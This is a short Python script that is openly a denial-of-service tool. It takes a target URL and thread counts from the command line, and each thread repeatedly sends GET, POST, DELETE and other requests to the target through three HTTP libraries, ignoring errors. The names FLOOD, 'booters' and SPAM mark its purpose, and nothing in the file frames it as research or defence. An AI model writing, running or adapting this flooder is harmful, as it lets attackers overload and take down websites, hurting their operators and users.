import requests,urllib3,httpx,threading,sys,time,sys
c = 0
def FLOOD(URL,nulled,timeouts,wait_time):
   met = ['GET','POST','HEAD','OPTIONS','DELETE','PUT','PATCH']
   if c == 1:
      while True:
          for _ in range(nulled):
           for me in met:
            try:
             if timeouts != 0:
              http = urllib3.PoolManager()
              h2 = httpx.request(me,URL, timeout=timeouts)
              r = http.request(me, URL, timeout=timeouts)
              r = http.request_encode_url(me, URL, timeout=timeouts)
              r = http.request_encode_body(me, URL, timeout=timeouts)
              s = requests.request(me, URL, timeout=timeouts)
             else:
              http = urllib3.PoolManager()
              h2 = httpx.request(me,URL)
              r = http.request(me, URL)
              r = http.request_encode_url(me, URL)
              r = http.request_encode_body(me, URL)
              s = requests.request(me, URL)
            except:pass
          if wait_time != 0:
            time.sleep(wait_time)
   else:
     threading.Thread(target=FLOOD,args=(url,nulled,timeouts,wait_time)).start()

url = sys.argv[1]
booters = int(sys.argv[2])
timeouts = int(sys.argv[3])
wait_time = int(sys.argv[4])
thread = sys.argv[5]
SPAM = sys.argv[6]
for _ in range(int(thread)):
   if int(SPAM) != 0 and int(SPAM) != 1:
     for _ in range(int(SPAM)):
       threading.Thread(target=FLOOD,args=(url,booters,timeouts,wait_time)).start()
   else:
    threading.Thread(target=FLOOD,args=(url,booters,timeouts,wait_time)).start()
c = 1